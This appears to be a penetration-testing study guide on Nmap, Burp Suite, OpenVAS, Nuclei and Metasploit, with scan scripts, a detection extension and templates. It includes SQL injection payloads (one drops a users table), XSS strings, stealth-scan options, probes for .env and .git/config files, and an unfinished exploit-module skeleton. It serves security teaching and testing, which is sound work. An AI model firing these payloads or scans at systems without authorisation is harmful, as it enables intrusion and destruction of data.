# Detailed Notes: Tools and Techniques

## Network Reconnaissance Tools - Advanced Usage

### Nmap - Network Discovery and Security Auditing

#### Advanced Nmap Scanning Techniques

**1. Comprehensive Network Discovery**

```bash
#!/bin/bash
# Advanced Network Discovery Script

# Function: Comprehensive network enumeration
network_discovery() {
    local target_network=$1
    local output_dir="nmap_results_$(date +%Y%m%d_%H%M%S)"
    
    mkdir -p "$output_dir"
    
    echo "[+] Starting comprehensive network discovery for $target_network"
    
    # Phase 1: Host Discovery (Ping Sweep)
    echo "[+] Phase 1: Host Discovery"
    nmap -sn $target_network -oA "$output_dir/host_discovery" --exclude-file exclude.txt
    
    # Extract live hosts for further scanning
    grep "Nmap scan report" "$output_dir/host_discovery.nmap" | awk '{print $5}' > "$output_dir/live_hosts.txt"
    
    # Phase 2: Port Scanning
    echo "[+] Phase 2: Port Scanning"
    # TCP SYN scan for top 1000 ports
    nmap -sS -T4 -iL "$output_dir/live_hosts.txt" -oA "$output_dir/tcp_scan"
    
    # UDP scan for common UDP services
    nmap -sU --top-ports 100 -T4 -iL "$output_dir/live_hosts.txt" -oA "$output_dir/udp_scan"
    
    # Phase 3: Service Version Detection
    echo "[+] Phase 3: Service Detection"
    nmap -sV -sC -T4 -iL "$output_dir/live_hosts.txt" -oA "$output_dir/service_scan"
    
    # Phase 4: OS Detection
    echo "[+] Phase 4: OS Detection"
    nmap -O -T4 -iL "$output_dir/live_hosts.txt" -oA "$output_dir/os_scan"
    
    # Phase 5: Vulnerability Scanning
    echo "[+] Phase 5: Vulnerability Scanning"
    nmap --script vuln -T4 -iL "$output_dir/live_hosts.txt" -oA "$output_dir/vuln_scan"
    
    # Generate summary report
    generate_nmap_report "$output_dir"
}

# Custom Nmap Scripts
custom_nmap_scripts() {
    local target=$1
    
    # HTTP enumeration
    nmap --script http-enum,http-headers,http-methods,http-robots.txt -p 80,443,8080,8443 $target
    
    # SMB enumeration
    nmap --script smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode -p 445 $target
    
    # DNS enumeration
    nmap --script dns-zone-transfer,dns-recursion,dns-cache-snoop -p 53 $target
    
    # SSL/TLS testing
    nmap --script ssl-enum-ciphers,ssl-cert,ssl-date,ssl-heartbleed -p 443 $target
}

# Stealth scanning techniques
stealth_scanning() {
    local target=$1
    
    # Decoy scanning
    nmap -D RND:10 $target
    
    # Source port manipulation
    nmap --source-port 53 $target
    
    # Fragmented packets
    nmap -f $target
    
    # Timing template (paranoid)
    nmap -T0 $target
    
    # Idle scan (requires zombie host)
    # nmap -sI zombie_host $target
}
```

**2. Custom Nmap NSE Scripts**

```lua
-- Custom NSE script for web application fingerprinting
local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"

description = [[
Advanced web application fingerprinting script that identifies
web technologies, frameworks, and potential vulnerabilities.
]]

author = "Security Researcher"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"discovery", "safe"}

portrule = shortport.http

action = function(host, port)
    local results = {}
    local path = "/"
    
    -- Get response headers
    local response = http.get(host, port, path)
    if not response then
        return nil
    end
    
    -- Analyze server header
    local server = response.header["server"]
    if server then
        table.insert(results, "Server: " .. server)
        
        -- Detect web server type
        if string.match(server:lower(), "apache") then
            table.insert(results, "Web Server: Apache HTTP Server")
        elseif string.match(server:lower(), "nginx") then
            table.insert(results, "Web Server: Nginx")
        elseif string.match(server:lower(), "iis") then
            table.insert(results, "Web Server: Microsoft IIS")
        end
    end
    
    -- Check for common headers
    local headers_to_check = {
        "x-powered-by",
        "x-aspnet-version",
        "x-generator",
        "x-drupal-cache",
        "x-wordpress-version"
    }
    
    for _, header in ipairs(headers_to_check) do
        local value = response.header[header]
        if value then
            table.insert(results, header .. ": " .. value)
        end
    end
    
    -- Check for common framework signatures in body
    local body = response.body
    if body then
        -- WordPress detection
        if string.match(body, "wp%-content") or string.match(body, "wordpress") then
            table.insert(results, "CMS: WordPress detected")
        end
        
        -- Drupal detection
        if string.match(body, "drupal") or string.match(body, "sites/default") then
            table.insert(results, "CMS: Drupal detected")
        end
        
        -- Joomla detection
        if string.match(body, "joomla") or string.match(body, "option=com_") then
            table.insert(results, "CMS: Joomla detected")
        end
    end
    
    -- Check for common files
    local common_files = {"/robots.txt", "/sitemap.xml", "/.htaccess", "/web.config"}
    for _, file in ipairs(common_files) do
        local file_response = http.get(host, port, file)
        if file_response and file_response.status == 200 then
            table.insert(results, "Found: " .. file)
        end
    end
    
    if #results > 0 then
        return stdnse.format_output(true, results)
    else
        return nil
    end
end
```

### Web Application Security Tools

#### Burp Suite Professional - Advanced Techniques

**1. Custom Burp Extensions**

```python
# Advanced Burp Suite Extension for Custom Vulnerability Detection
from burp import IBurpExtender, IScannerCheck, IScanIssue, IHttpRequestResponse
from java.io import PrintWriter
import re

class BurpExtender(IBurpExtender, IScannerCheck):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Advanced Security Scanner")
        callbacks.registerScannerCheck(self)
        
        self._stdout = PrintWriter(callbacks.getStdout(), True)
        self._stderr = PrintWriter(callbacks.getStderr(), True)
        
        print("Advanced Security Scanner loaded successfully")
    
    def doPassiveScan(self, baseRequestResponse):
        """Passive scanning for security issues"""
        issues = []
        
        # Analyze response for various security issues
        response = baseRequestResponse.getResponse()
        if response:
            response_info = self._helpers.analyzeResponse(response)
            headers = response_info.getHeaders()
            body = self._helpers.bytesToString(response)[response_info.getBodyOffset():]
            
            # Check for missing security headers
            issues.extend(self.checkSecurityHeaders(baseRequestResponse, headers))
            
            # Check for sensitive information disclosure
            issues.extend(self.checkInformationDisclosure(baseRequestResponse, body))
            
            # Check for common web vulnerabilities
            issues.extend(self.checkWebVulnerabilities(baseRequestResponse, body))
        
        return issues
    
    def doActiveScan(self, baseRequestResponse, insertionPoint):
        """Active scanning with custom payloads"""
        issues = []
        
        # SQL Injection testing
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT null,null,null--",
            "'; WAITFOR DELAY '00:00:05'--"
        ]
        
        for payload in sql_payloads:
            issues.extend(self.testSQLInjection(baseRequestResponse, insertionPoint, payload))
        
        # XSS testing
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "';alert('XSS');//"
        ]
        
        for payload in xss_payloads:
            issues.extend(self.testXSS(baseRequestResponse, insertionPoint, payload))
        
        return issues
    
    def checkSecurityHeaders(self, baseRequestResponse, headers):
        """Check for missing security headers"""
        issues = []
        
        required_headers = {
            'X-Frame-Options': 'Missing X-Frame-Options header',
            'X-Content-Type-Options': 'Missing X-Content-Type-Options header',
            'X-XSS-Protection': 'Missing X-XSS-Protection header',
            'Strict-Transport-Security': 'Missing HSTS header',
            'Content-Security-Policy': 'Missing CSP header'
        }
        
        present_headers = [header.lower() for header in headers]
        
        for header, description in required_headers.items():
            if not any(header.lower() in present_header for present_header in present_headers):
                issues.append(CustomScanIssue(
                    baseRequestResponse.getHttpService(),
                    self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
                    [baseRequestResponse],
                    "Missing Security Header",
                    description,
                    "Medium"
                ))
        
        return issues
    
    def checkInformationDisclosure(self, baseRequestResponse, body):
        """Check for sensitive information in response"""
        issues = []
        
        sensitive_patterns = {
            r'password\s*[:=]\s*["\']?[\w!@#$%^&*()]+["\']?': 'Password disclosure',
            r'api[_-]?key\s*[:=]\s*["\']?[\w-]+["\']?': 'API key disclosure',
            r'secret\s*[:=]\s*["\']?[\w!@#$%^&*()]+["\']?': 'Secret disclosure',
            r'(?:mysql|postgresql|oracle)://[\w:@./]+': 'Database connection string',
            r'-----BEGIN (?:RSA )?PRIVATE KEY-----': 'Private key disclosure'
        }
        
        for pattern, description in sensitive_patterns.items():
            if re.search(pattern, body, re.IGNORECASE):
                issues.append(CustomScanIssue(
                    baseRequestResponse.getHttpService(),
                    self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
                    [baseRequestResponse],
                    "Information Disclosure",
                    description,
                    "High"
                ))
        
        return issues

class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, severity):
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail
        self._severity = severity
    
    def getUrl(self):
        return self._url
    
    def getIssueName(self):
        return self._name
    
    def getIssueType(self):
        return 0
    
    def getSeverity(self):
        return self._severity
    
    def getConfidence(self):
        return "Certain"
    
    def getIssueBackground(self):
        return None
    
    def getRemediationBackground(self):
        return None
    
    def getIssueDetail(self):
        return self._detail
    
    def getRemediationDetail(self):
        return None
    
    def getHttpMessages(self):
        return self._httpMessages
    
    def getHttpService(self):
        return self._httpService
```

**2. Automated Burp Scanning with Python**

```python
import requests
import json
import time
from urllib.parse import urljoin

class BurpAPIClient:
    def __init__(self, burp_host="127.0.0.1", burp_port=1337, api_key=None):
        self.base_url = f"http://{burp_host}:{burp_port}"
        self.api_key = api_key
        self.session = requests.Session()
        
        if api_key:
            self.session.headers.update({"X-API-Key": api_key})
    
    def start_scan(self, target_url, scan_config="NamedConfiguration:Audit coverage - maximum"):
        """Start a new scan"""
        endpoint = "/burp/scanner/scans"
        data = {
            "startUrl": target_url,
            "scanConfigurationIds": [scan_config]
        }
        
        response = self.session.post(urljoin(self.base_url, endpoint), json=data)
        if response.status_code == 201:
            location = response.headers.get('Location')
            scan_id = location.split('/')[-1] if location else None
            return scan_id
        else:
            raise Exception(f"Failed to start scan: {response.text}")
    
    def get_scan_status(self, scan_id):
        """Get scan status"""
        endpoint = f"/burp/scanner/scans/{scan_id}"
        response = self.session.get(urljoin(self.base_url, endpoint))
        
        if response.status_code == 200:
            return response.json()
        else:
            raise Exception(f"Failed to get scan status: {response.text}")
    
    def get_scan_issues(self, scan_id):
        """Get scan issues"""
        endpoint = f"/burp/scanner/scans/{scan_id}/issues"
        response = self.session.get(urljoin(self.base_url, endpoint))
        
        if response.status_code == 200:
            return response.json()
        else:
            raise Exception(f"Failed to get scan issues: {response.text}")
    
    def wait_for_scan_completion(self, scan_id, check_interval=30):
        """Wait for scan to complete"""
        print(f"[+] Waiting for scan {scan_id} to complete...")
        
        while True:
            status = self.get_scan_status(scan_id)
            scan_status = status.get('scanStatus')
            
            print(f"[*] Scan status: {scan_status}")
            
            if scan_status in ['succeeded', 'failed', 'cancelled']:
                break
            
            time.sleep(check_interval)
        
        return scan_status
    
    def automated_scan_workflow(self, target_urls, output_file="scan_results.json"):
        """Automated scanning workflow"""
        all_results = []
        
        for target_url in target_urls:
            print(f"[+] Starting scan for {target_url}")
            
            try:
                # Start scan
                scan_id = self.start_scan(target_url)
                print(f"[+] Scan started with ID: {scan_id}")
                
                # Wait for completion
                final_status = self.wait_for_scan_completion(scan_id)
                
                if final_status == 'succeeded':
                    # Get results
                    issues = self.get_scan_issues(scan_id)
                    
                    scan_result = {
                        'target_url': target_url,
                        'scan_id': scan_id,
                        'status': final_status,
                        'issues': issues,
                        'timestamp': time.time()
                    }
                    
                    all_results.append(scan_result)
                    print(f"[+] Scan completed. Found {len(issues)} issues.")
                
                else:
                    print(f"[-] Scan failed with status: {final_status}")
            
            except Exception as e:
                print(f"[-] Error scanning {target_url}: {str(e)}")
        
        # Save results
        with open(output_file, 'w') as f:
            json.dump(all_results, f, indent=2)
        
        print(f"[+] Results saved to {output_file}")
        return all_results

# Usage example
if __name__ == "__main__":
    # Initialize Burp API client
    burp_client = BurpAPIClient(api_key="your-api-key-here")
    
    # Target URLs to scan
    targets = [
        "https://example.com",
        "https://test.example.com",
        "https://app.example.com"
    ]
    
    # Run automated scanning
    results = burp_client.automated_scan_workflow(targets)
    
    # Generate summary report
    total_issues = sum(len(result['issues']) for result in results)
    print(f"[+] Scanning complete. Total issues found: {total_issues}")
```

### Vulnerability Assessment Tools

#### OpenVAS - Comprehensive Vulnerability Management

**1. OpenVAS Automation Scripts**

```python
#!/usr/bin/env python3
import xml.etree.ElementTree as ET
import subprocess
import json
import time
from datetime import datetime

class OpenVASManager:
    def __init__(self, username="admin", password="admin", host="127.0.0.1", port=9390):
        self.username = username
        self.password = password
        self.host = host
        self.port = port
        self.omp_command = f"omp -u {username} -w {password} -h {host} -p {port}"
    
    def execute_omp_command(self, command):
        """Execute OMP command and return result"""
        full_command = f"{self.omp_command} {command}"
        
        try:
            result = subprocess.run(full_command, shell=True, capture_output=True, text=True)
            return result.stdout, result.stderr, result.returncode
        except Exception as e:
            return None, str(e), 1
    
    def create_target(self, name, hosts, port_list="Full and fast"):
        """Create a scan target"""
        command = f'--xml=\'<create_target><name>{name}</name><hosts>{hosts}</hosts><port_list id="{self.get_port_list_id(port_list)}"/></create_target>\''
        
        stdout, stderr, returncode = self.execute_omp_command(command)
        
        if returncode == 0:
            # Parse XML response to get target ID
            root = ET.fromstring(stdout)
            target_id = root.get('id')
            return target_id
        else:
            raise Exception(f"Failed to create target: {stderr}")
    
    def get_port_list_id(self, port_list_name):
        """Get port list ID by name"""
        command = '--get-port-lists'
        stdout, stderr, returncode = self.execute_omp_command(command)
        
        if returncode == 0:
            root = ET.fromstring(stdout)
            for port_list in root.findall('port_list'):
                if port_list.find('name').text == port_list_name:
                    return port_list.get('id')
        
        raise Exception(f"Port list '{port_list_name}' not found")
    
    def get_config_id(self, config_name="Full and fast"):
        """Get scan configuration ID by name"""
        command = '--get-configs'
        stdout, stderr, returncode = self.execute_omp_command(command)
        
        if returncode == 0:
            root = ET.fromstring(stdout)
            for config in root.findall('config'):
                if config.find('name').text == config_name:
                    return config.get('id')
        
        raise Exception(f"Configuration '{config_name}' not found")
    
    def create_task(self, name, target_id, config_name="Full and fast"):
        """Create a scan task"""
        config_id = self.get_config_id(config_name)
        
        command = f'--xml=\'<create_task><name>{name}</name><config id="{config_id}"/><target id="{target_id}"/></create_task>\''
        
        stdout, stderr, returncode = self.execute_omp_command(command)
        
        if returncode == 0:
            root = ET.fromstring(stdout)
            task_id = root.get('id')
            return task_id
        else:
            raise Exception(f"Failed to create task: {stderr}")
    
    def start_task(self, task_id):
        """Start a scan task"""
        command = f'--start-task {task_id}'
        stdout, stderr, returncode = self.execute_omp_command(command)
        
        if returncode == 0:
            return True
        else:
            raise Exception(f"Failed to start task: {stderr}")
    
    def get_task_status(self, task_id):
        """Get task status"""
        command = f'--get-tasks --task-id={task_id}'
        stdout, stderr, returncode = self.execute_omp_command(command)
        
        if returncode == 0:
            root = ET.fromstring(stdout)
            task = root.find('task')
            if task is not None:
                status = task.find('status').text
                progress = task.find('progress').text
                return status, progress
        
        return None, None
    
    def wait_for_task_completion(self, task_id, check_interval=60):
        """Wait for task to complete"""
        print(f"[+] Waiting for task {task_id} to complete...")
        
        while True:
            status, progress = self.get_task_status(task_id)
            
            if status:
                print(f"[*] Task status: {status}, Progress: {progress}%")
                
                if status in ['Done', 'Stopped', 'Interrupted']:
                    break
            
            time.sleep(check_interval)
        
        return status
    
    def get_report_id(self, task_id):
        """Get report ID for a completed task"""
        command = f'--get-tasks --task-id={task_id}'
        stdout, stderr, returncode = self.execute_omp_command(command)
        
        if returncode == 0:
            root = ET.fromstring(stdout)
            task = root.find('task')
            if task is not None:
                report = task.find('last_report/report')
                if report is not None:
                    return report.get('id')
        
        return None
    
    def download_report(self, report_id, format_id="a994b278-1f62-11e1-96ac-406186ea4fc5", output_file=None):
        """Download report in specified format"""
        # Format IDs:
        # PDF: c402cc3e-b531-11e1-9163-406186ea4fc5
        # XML: a994b278-1f62-11e1-96ac-406186ea4fc5
        # CSV: c1645568-627a-11e3-a660-406186ea4fc5
        
        if not output_file:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            extension = "xml" if format_id == "a994b278-1f62-11e1-96ac-406186ea4fc5" else "pdf"
            output_file = f"openvas_report_{timestamp}.{extension}"
        
        command = f'--get-report {report_id} --format {format_id}'
        stdout, stderr, returncode = self.execute_omp_command(command)
        
        if returncode == 0:
            with open(output_file, 'w') as f:
                f.write(stdout)
            return output_file
        else:
            raise Exception(f"Failed to download report: {stderr}")
    
    def automated_scan_workflow(self, targets, scan_config="Full and fast"):
        """Complete automated scanning workflow"""
        results = []
        
        for target_name, target_hosts in targets.items():
            print(f"[+] Starting scan for {target_name} ({target_hosts})")
            
            try:
                # Create target
                target_id = self.create_target(target_name, target_hosts)
                print(f"[+] Created target with ID: {target_id}")
                
                # Create task
                task_id = self.create_task(f"Scan_{target_name}", target_id, scan_config)
                print(f"[+] Created task with ID: {task_id}")
                
                # Start task
                self.start_task(task_id)
                print(f"[+] Started task {task_id}")
                
                # Wait for completion
                final_status = self.wait_for_task_completion(task_id)
                
                if final_status == 'Done':
                    # Get and download report
                    report_id = self.get_report_id(task_id)
                    
                    if report_id:
                        xml_report = self.download_report(report_id, "a994b278-1f62-11e1-96ac-406186ea4fc5")
                        pdf_report = self.download_report(report_id, "c402cc3e-b531-11e1-9163-406186ea4fc5")
                        
                        results.append({
                            'target_name': target_name,
                            'target_hosts': target_hosts,
                            'task_id': task_id,
                            'report_id': report_id,
                            'xml_report': xml_report,
                            'pdf_report': pdf_report,
                            'status': final_status
                        })
                        
                        print(f"[+] Scan completed. Reports saved: {xml_report}, {pdf_report}")
                    else:
                        print(f"[-] Could not retrieve report for task {task_id}")
                else:
                    print(f"[-] Scan failed with status: {final_status}")
            
            except Exception as e:
                print(f"[-] Error scanning {target_name}: {str(e)}")
        
        return results

# Usage example
if __name__ == "__main__":
    # Initialize OpenVAS manager
    openvas = OpenVASManager(username="admin", password="your-password")
    
    # Define targets
    targets = {
        "Internal_Network": "192.168.1.0/24",
        "DMZ_Servers": "10.0.1.1-10.0.1.50",
        "Web_Server": "example.com"
    }
    
    # Run automated scanning
    results = openvas.automated_scan_workflow(targets)
    
    # Generate summary
    print(f"[+] Scanning complete. {len(results)} targets processed.")
    for result in results:
        print(f"  - {result['target_name']}: {result['status']}")
```

#### Nuclei - Fast and Customizable Vulnerability Scanner

**1. Custom Nuclei Templates**

```yaml
# Custom template for detecting misconfigured servers
id: misconfigured-server-detection

info:
  name: Misconfigured Server Detection
  author: security-researcher
  severity: medium
  description: Detects common server misconfigurations
  tags: misconfig,server,security

requests:
  - method: GET
    path:
      - "{{BaseURL}}/server-status"
      - "{{BaseURL}}/server-info" 
      - "{{BaseURL}}/admin/"
      - "{{BaseURL}}/phpmyadmin/"
      - "{{BaseURL}}/phpinfo.php"
      - "{{BaseURL}}/.env"
      - "{{BaseURL}}/config.php"
      - "{{BaseURL}}/wp-config.php"
      - "{{BaseURL}}/database.yml"
      - "{{BaseURL}}/.git/config"

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "Apache Server Status"
          - "Server Information"
        part: body

      - type: word
        words:
          - "phpMyAdmin"
          - "Welcome to phpMyAdmin"
        part: body

      - type: word
        words:
          - "PHP Version"
          - "phpinfo()"
        part: body

      - type: regex
        regex:
          - "DB_PASSWORD=['\"].*['\"]"
          - "DATABASE_URL=['\"].*['\"]"
        part: body

      - type: word
        words:
          - "[core]"
          - "repositoryformatversion"
        part: body

    extractors:
      - type: regex
        name: version_info
        regex:
          - "Apache/([0-9.]+)"
          - "PHP/([0-9.]+)"
          - "nginx/([0-9.]+)"
        part: body
```

```yaml
# Advanced SQL injection detection template
id: advanced-sql-injection

info:
  name: Advanced SQL Injection Detection
  author: security-researcher
  severity: high
  description: Detects SQL injection vulnerabilities using time-based and error-based techniques
  tags: sqli,injection,database

requests:
  - method: GET
    path:
      - "{{BaseURL}}"
    
    payloads:
      sqli_payloads:
        - "'"
        - "''"
        - "' OR '1'='1"
        - "' OR '1'='1' --"
        - "' OR '1'='1' #"
        - "'; DROP TABLE users; --"
        - "' UNION SELECT NULL--"
        - "' WAITFOR DELAY '00:00:05'--"
        - "'; WAITFOR DELAY '00:00:05'--"
        - "' OR SLEEP(5)--"
        - "'; SELECT SLEEP(5)--"
        - "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{sqli_payloads}}"

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "SQL syntax"
          - "mysql_fetch"
          - "ORA-01756"
          - "Microsoft OLE DB"
          - "PostgreSQL query failed"
          - "SQLServer JDBC Driver"
        part: body

      - type: word
        words:
          - "Warning: mysql"
          - "MySQLSyntaxErrorException"
          - "valid MySQL result"
          - "check the manual that corresponds to your MySQL"
        part: body

      - type: dsl
        dsl:
          - 'duration>=5'
        condition: and

    extractors:
      - type: regex
        name: error_details
        regex:
          - "You have an error in your SQL syntax.*?line [0-9]+"
          - "Warning: mysql_.*?in (.*?) on line [0-9]+"
        part: body
```

**2. Nuclei Automation Framework**

```python
#!/usr/bin/env python3
import subprocess
import json
import os
import argparse
from datetime import datetime
import requests

class NucleiScanner:
    def __init__(self, nuclei_path="nuclei", templates_dir="~/nuclei-templates"):
        self.nuclei_path = nuclei_path
        self.templates_dir = os.path.expanduser(templates_dir)
        self.update_templates()
    
    def update_templates(self):
        """Update Nuclei templates"""
        print("[+] Updating Nuclei templates...")
        cmd = [self.nuclei_path, "-update-templates"]
        subprocess.run(cmd, capture_output=True)
    
    def run_scan(self, targets, templates=None, severity=None, output_file=None, custom_options=None):
        """Run Nuclei scan with specified parameters"""
        cmd = [self.nuclei_path]
        
        # Add targets
        if isinstance(targets, list):
            cmd.extend(["-l", self.create_target_file(targets)])
        else:
            cmd.extend(["-u", targets])
        
        # Add templates
        if templates:
            if isinstance(templates, list):
                cmd.extend(["-t", ",".join(templates)])
            else:
                cmd.extend(["-t", templates])
        
        # Add severity filter
        if severity:
            cmd.extend(["-severity", severity])
        
        # Output options
        if output_file:
            cmd.extend(["-o", output_file])
        
        # JSON output for parsing
        cmd.extend(["-json"])
        
        # Custom options
        if custom_options:
            cmd.extend(custom_options)
        
        print(f"[+] Running command: {' '.join(cmd)}")
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)
            return result.stdout, result.stderr, result.returncode
        except subprocess.TimeoutExpired:
            print("[-] Scan timed out after 1 hour")
            return None, "Timeout", 1
    
    def create_target_file(self, targets):
        """Create temporary target file"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        target_file = f"/tmp/nuclei_targets_{timestamp}.txt"
        
        with open(target_file, 'w') as f:
            for target in targets:
                f.write(f"{target}\n")
        
        return target_file
    
    def parse_results(self, json_output):
        """Parse Nuclei JSON output"""
        results = []
        
        for line in json_output.strip().split('\n'):
            if line.strip():
                try:
                    result = json.loads(line)
                    results.append(result)
                except json.JSONDecodeError:
                    continue
        
        return results
    
    def generate_report(self, results, output_file="nuclei_report.html"):
        """Generate HTML report from results"""
        html_template = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Nuclei Scan Report</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 20px; }
                .header { background-color: #f0f0f0; padding: 20px; border-radius: 5px; }
                .finding { border: 1px solid #ddd; margin: 10px 0; padding: 15px; border-radius: 5px; }
                .critical { border-left: 5px solid #ff0000; }
                .high { border-left: 5px solid #ff6600; }
                .medium { border-left: 5px solid #ffaa00; }
                .low { border-left: 5px solid #00aa00; }
                .info { border-left: 5px solid #0066ff; }
                .unknown { border-left: 5px solid #666666; }
            </style>
        </head>
        <body>
            <div class="header">
                <h1>Nuclei Vulnerability Scan Report</h1>
                <p>Generated on: {timestamp}</p>
                <p>Total findings: {total_findings}</p>
            </div>
            
            <h2>Summary</h2>
            <ul>
                <li>Critical: {critical_count}</li>
                <li>High: {high_count}</li>
                <li>Medium: {medium_count}</li>
                <li>Low: {low_count}</li>
                <li>Info: {info_count}</li>
            </ul>
            
            <h2>Detailed Findings</h2>
            {findings_html}
        </body>
        </html>
        """
        
        # Count findings by severity
        severity_counts = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0, 'info': 0}
        findings_html = ""
        
        for result in results:
            severity = result.get('info', {}).get('severity', 'unknown').lower()
            if severity in severity_counts:
                severity_counts[severity] += 1
            
            finding_html = f"""
            <div class="finding {severity}">
                <h3>{result.get('info', {}).get('name', 'Unknown')}</h3>
                <p><strong>Severity:</strong> {severity.title()}</p>
                <p><strong>Target:</strong> {result.get('host', 'Unknown')}</p>
                <p><strong>Template:</strong> {result.get('template-id', 'Unknown')}</p>
                <p><strong>Description:</strong> {result.get('info', {}).get('description', 'No description')}</p>
                <p><strong>Matched URL:</strong> {result.get('matched-at', 'Unknown')}</p>
                <p><strong>Tags:</strong> {', '.join(result.get('info', {}).get('tags', []))}</p>
            </div>
            """
            findings_html += finding_html
        
        # Generate final HTML
        html_content = html_template.format(
            timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            total_findings=len(results),
            critical_count=severity_counts['critical'],
            high_count=severity_counts['high'],
            medium_count=severity_counts['medium'],
            low_count=severity_counts['low'],
            info_count=severity_counts['info'],
            findings_html=findings_html
        )
        
        with open(output_file, 'w') as f:
            f.write(html_content)
        
        return output_file
    
    def comprehensive_scan(self, targets, output_dir="nuclei_results"):
        """Run comprehensive scan with multiple template categories"""
        os.makedirs(output_dir, exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        scan_categories = {
            'cves': f"{self.templates_dir}/cves/",
            'vulnerabilities': f"{self.templates_dir}/vulnerabilities/",
            'misconfigurations': f"{self.templates_dir}/misconfiguration/",
            'technologies': f"{self.templates_dir}/technologies/",
            'exposures': f"{self.templates_dir}/exposures/",
            'takeovers': f"{self.templates_dir}/takeovers/"
        }
        
        all_results = []
        
        for category, template_path in scan_categories.items():
            if os.path.exists(template_path):
                print(f"[+] Running {category} scan...")
                
                output_file = os.path.join(output_dir, f"{category}_{timestamp}.json")
                
                stdout, stderr, returncode = self.run_scan(
                    targets=targets,
                    templates=template_path,
                    output_file=output_file,
                    custom_options=["-rate-limit", "100", "-bulk-size", "25"]
                )
                
                if returncode == 0 and stdout:
                    results = self.parse_results(stdout)
                    all_results.extend(results)
                    print(f"[+] {category} scan completed. Found {len(results)} issues.")
                else:
                    print(f"[-] {category} scan failed: {stderr}")
        
        # Generate comprehensive report
        if all_results:
            report_file = os.path.join(output_dir, f"comprehensive_report_{timestamp}.html")
            self.generate_report(all_results, report_file)
            print(f"[+] Comprehensive report generated: {report_file}")
        
        return all_results

# CLI interface
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Nuclei Automation Framework")
    parser.add_argument("-t", "--targets", required=True, help="Target URL or file containing targets")
    parser.add_argument("-o", "--output", default="nuclei_scan", help="Output directory")
    parser.add_argument("--severity", help="Filter by severity (critical,high,medium,low,info)")
    parser.add_argument("--templates", help="Custom templates to use")
    parser.add_argument("--comprehensive", action="store_true", help="Run comprehensive scan")
    
    args = parser.parse_args()
    
    # Initialize scanner
    scanner = NucleiScanner()
    
    # Prepare targets
    if os.path.isfile(args.targets):
        with open(args.targets, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
    else:
        targets = args.targets
    
    # Run scan
    if args.comprehensive:
        results = scanner.comprehensive_scan(targets, args.output)
        print(f"[+] Comprehensive scan completed. Total findings: {len(results)}")
    else:
        stdout, stderr, returncode = scanner.run_scan(
            targets=targets,
            templates=args.templates,
            severity=args.severity
        )
        
        if returncode == 0:
            results = scanner.parse_results(stdout)
            report_file = scanner.generate_report(results)
            print(f"[+] Scan completed. Report generated: {report_file}")
        else:
            print(f"[-] Scan failed: {stderr}")
```

### Exploitation Frameworks

#### Metasploit Framework - Advanced Usage

**1. Custom Metasploit Modules**

```ruby
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Custom Web Application Exploit',
      'Description'    => %q{
        This module exploits a custom vulnerability in a web application.
        It demonstrates advanced exploitation techniques including payload
        encoding, target detection, and reliability mechanisms.
      },
      'Author'         => ['Security Researcher'],
      'License'        => MSF_LICENSE,
      'References'     => [
        ['CVE', '2023-XXXX'],
        ['URL', 'https://example.com/advisory']
      ],
      'Platform'       => ['linux', 'windows'],
      'Targets'        => [
        [
          'Linux x86',
          {
            'Arch' => ARCH_X86,
            'Platform' => 'linux'
          }
        ],
        [
          'Windows x86',
          {
            'Arch' => ARCH_X86,
            'Platform' => 'windows'
          }
        ]
      ],
      'Payload'        => {
        'Space'       => 1024,
        'DisableNops' => true,
        'BadChars'    => "\x00\x0a\x0d\x22\x27"
      },
      'DisclosureDate' => '2023-01-01',
      'DefaultTarget'  => 0
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'The URI of the vulnerable application', '/']),
      OptString.new('USERNAME', [false, 'Username for authentication']),
      OptString.new('PASSWORD', [false, 'Password for authentication']),
      OptBool.new('SSL', [true, 'Use SSL/TLS for connection', false])
    ])
  end

  def check
    # Implement vulnerability detection
    vprint_status("Checking if target is vulnerable...")
    
    begin
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(datastore['TARGETURI'], 'version.php'),
        'vars_get' => {
          'info' => '1'
        }
      })

      if res && res.code == 200
        version = res.body.match(/Version: ([0-9.]+)/)
        if version && Rex::Version.new(version[1]) <= Rex::Version.new('2.1.0')
          return Exploit::CheckCode::Appears
        end
      end

      return Exploit::CheckCode::Safe
    rescue ::Rex::ConnectionError
      return Exploit::CheckCode::Unknown
    end
  end

  def exploit
    print_status("Attempting to exploit #{target.name}")
    
    # Step 1: Authenticate if credentials provided
    if datastore['USERNAME'] && datastore['PASSWORD']
      print_status("Authenticating with provided credentials...")
      auth_result = authenticate
      unless auth_result
